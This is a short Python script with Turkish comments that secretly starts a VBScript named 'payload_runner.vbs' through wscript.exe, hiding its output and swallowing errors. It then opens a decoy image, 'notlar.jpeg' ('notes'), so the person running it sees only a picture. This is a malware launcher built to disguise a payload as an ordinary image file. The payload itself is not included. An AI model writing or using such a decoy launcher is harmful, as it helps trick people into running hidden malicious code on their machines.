import os
import subprocess

# Gerçek resim dosyası
real_image = "notlar.jpeg"

# Payload başlat
try:
    subprocess.Popen(["wscript.exe", "payload_runner.vbs"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
except:
    pass

# Resmi aç
try:
    os.startfile(real_image)
except:
    pass
